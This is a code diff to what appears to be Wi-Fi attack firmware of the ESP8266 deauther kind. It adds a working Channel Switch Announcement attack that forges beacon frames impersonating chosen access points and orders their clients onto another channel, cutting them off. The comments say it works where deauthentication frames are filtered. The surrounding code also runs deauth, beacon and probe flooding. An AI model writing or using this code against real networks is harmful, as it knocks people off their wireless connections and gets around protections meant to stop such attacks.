@@ -45,18 +45,19 @@ void Attack::start() {
                   (unsigned)names.selected());
 }
 
-void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
+void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool csa, bool output, uint32_t timeout) {
     Attack::beacon.active = beacon;
     Attack::deauth.active = deauth || deauthAll;
     Attack::deauthAll     = deauthAll;
     Attack::probe.active  = probe;
+    Attack::csa.active    = csa;
 
     Attack::output  = output;
     Attack::timeout = timeout;
 
     // if (((beacon || probe) && ssids.count() > 0) || (deauthAll && scan.countAll() > 0) || (deauth &&
     // scan.countSelected() > 0)){
-    if (beacon || probe || deauthAll || deauth) {
+    if (beacon || probe || deauthAll || deauth || csa) {
         start();
     } else {
         prntln(A_NO_MODE_ERROR);
@@ -72,28 +73,43 @@ void Attack::stop() {
         deauthPkts           = 0;
         beaconPkts           = 0;
         probePkts            = 0;
+        csaPkts              = 0;
         deauth.packetCounter = 0;
         beacon.packetCounter = 0;
         probe.packetCounter  = 0;
+        csa.packetCounter    = 0;
         deauth.maxPkts       = 0;
         beacon.maxPkts       = 0;
         probe.maxPkts        = 0;
+        csa.maxPkts          = 0;
         packetRate           = 0;
         deauth.tc            = 0;
         beacon.tc            = 0;
         probe.tc             = 0;
+        csa.tc               = 0;
         deauth.active        = false;
         beacon.active        = false;
         probe.active         = false;
+        csa.active           = false;
         deauthRate.clear();  // burst schedulers re-arm on next start
         beaconRate.clear();
         probeRate.clear();
+        csaRate.clear();
         prntln(A_STOP);
     }
 }
 
 bool Attack::isRunning() {
     return running;
+}
+
+uint32_t Attack::getElapsed() {
+    if (!running) return 0;
+    return currentTime - attackStartTime;
+}
+
+bool Attack::isKill() {
+    return running && deauthAll;
 }
 
 void Attack::updateCounter() {
@@ -127,6 +143,15 @@ void Attack::updateCounter() {
     if (probe.active) probe.maxPkts = ssids.count() * settings::getAttackSettings().probe_frames_per_ssid;
     else probe.maxPkts = 0;
 
+    // CSA beacons per second: 10 per selected AP (clients need several CSA
+    // beacons before they honour the switch)
+    if (csa.active) {
+        csa.maxPkts = accesspoints.selected() * 10;
+        if (csa.maxPkts < 10) csa.maxPkts = 10;
+    } else {
+        csa.maxPkts = 0;
+    }
+
     // random transmission power
     if (settings::getAttackSettings().random_tx && (beacon.active || probe.active)) setOutputPower(random(21));
     else setOutputPower(20.5f);
@@ -135,13 +160,16 @@ void Attack::updateCounter() {
     deauthPkts           = deauth.packetCounter;
     beaconPkts           = beacon.packetCounter;
     probePkts            = probe.packetCounter;
+    csaPkts              = csa.packetCounter;
     packetRate           = tmpPacketRate;
     deauth.packetCounter = 0;
     beacon.packetCounter = 0;
     probe.packetCounter  = 0;
+    csa.packetCounter    = 0;
     deauth.tc            = 0;
     beacon.tc            = 0;
     probe.tc             = 0;
+    csa.tc               = 0;
     tmpPacketRate        = 0;
 }
 
@@ -181,6 +209,7 @@ void Attack::update() {
     deauthAllUpdate();
     beaconUpdate();
     probeUpdate();
+    csaUpdate();
 
     // each second
     if (currentTime - attackTime > 1000) {
@@ -280,6 +309,93 @@ void Attack::beaconUpdate() {
             if (beacon.tc >= ssids.count()) beacon.tc = 0;
         }
     }
+}
+
+/* ===== Channel Switch Announcement attack (plan 4.2) =====
+   Spams CSA beacons that impersonate the selected APs and tell every
+   listening client "move to channel X now". Clients that obey drift off
+   the AP's real channel -> they lose the network without a single deauth
+   frame (works even where deauth frames are rate-limited/ignored). */
+void Attack::csaUpdate() {
+    if (!csa.active || (csa.maxPkts == 0) || (csa.packetCounter >= csa.maxPkts)) return;
+    if (!csaRate.allow(csa.maxPkts, currentTime)) return; // burst scheduler
+
+    int n = accesspoints.count();
+    if (n <= 0) return;
+
+    // round-robin through the selected APs, one AP per granted token
+    for (int guard = 0; guard < n; guard++) {
+        if (csa.tc >= n) csa.tc = 0;
+        int idx = csa.tc++;
+
+        if (!accesspoints.getSelected(idx)) continue;
+
+        uint8_t ch = accesspoints.getCh(idx);
+        if (ch < 1 || ch > 14) ch = 1;
+        uint8_t newCh = (uint8_t)((ch % 13) + 1); // 1..13, never channel 0
+
+        uint8_t enc = accesspoints.getEnc(idx);
+        bool wpa2   = (enc == ENC_TYPE_CCMP) || (enc == ENC_TYPE_TKIP) || (enc == ENC_TYPE_AUTO);
+
+        String ssid = accesspoints.getSSID(idx);
+        if (ssid.length() > 32) ssid = ssid.substring(0, 32);
+
+        if (sendCSA(accesspoints.getMac(idx), ssid.c_str(), ch, wpa2, newCh)) {
+            csa.packetCounter++;
+        }
+        return; // one AP per token
+    }
+}
+
+bool Attack::sendCSA(uint8_t* apMac, const char* ssid, uint8_t ch, bool wpa2, uint8_t newCh) {
+    if (!apMac || !ssid) return false;
+
+    uint8_t ssidLen = (uint8_t)strlen(ssid);
+    if (ssidLen > 32) ssidLen = 32;
+
+    uint16_t i = 0;
+
+    // ===== 802.11 beacon header ===== //
+    csaPacket[i++] = 0x80;                    // frame control: beacon
+    csaPacket[i++] = 0x00;
+    csaPacket[i++] = 0x00;                    // duration
+    csaPacket[i++] = 0x00;
+    memset(&csaPacket[i], 0xFF, 6); i += 6;   // destination: broadcast
+    memcpy(&csaPacket[i], apMac, 6); i += 6;  // source: target AP
+    memcpy(&csaPacket[i], apMac, 6); i += 6;  // BSSID: target AP
+    csaPacket[i++] = 0x00;                    // sequence (SDK fills)
+    csaPacket[i++] = 0x00;
+
+    // ===== fixed beacon parameters ===== //
+    memcpy(&csaPacket[i], &beaconPacket[24], 8); i += 8; // timestamp
+    csaPacket[i++] = beaconPacket[32];                   // beacon interval
+    csaPacket[i++] = beaconPacket[33];
+    csaPacket[i++] = wpa2 ? 0x31 : 0x21;                 // caps: privacy bit only when encrypted
+    csaPacket[i++] = 0x00;
+
+    // ===== tagged parameters ===== //
+    csaPacket[i++] = 0x00;                   // SSID
+    csaPacket[i++] = ssidLen;
+    memcpy(&csaPacket[i], ssid, ssidLen); i += ssidLen;
+
+    memcpy(&csaPacket[i], &beaconPacket[70], 10); i += 10; // supported rates
+
+    csaPacket[i++] = 0x03;                   // DS parameter set: current channel
+    csaPacket[i++] = 0x01;
+    csaPacket[i++] = ch;
+
+    if (wpa2) {                              // RSN (WPA2)
+        memcpy(&csaPacket[i], &beaconPacket[83], 26); i += 26;
+    }
+
+    // CSA IE (tag 37): mode=1 (restrict to new channel), new channel, count=1
+    csaPacket[i++] = 0x25;
+    csaPacket[i++] = 0x03;
+    csaPacket[i++] = 0x01;
+    csaPacket[i++] = newCh;
+    csaPacket[i++] = 0x01;
+
+    return sendPacket(csaPacket, i, ch, true);
 }
 
 bool Attack::deauthStation(int num) {
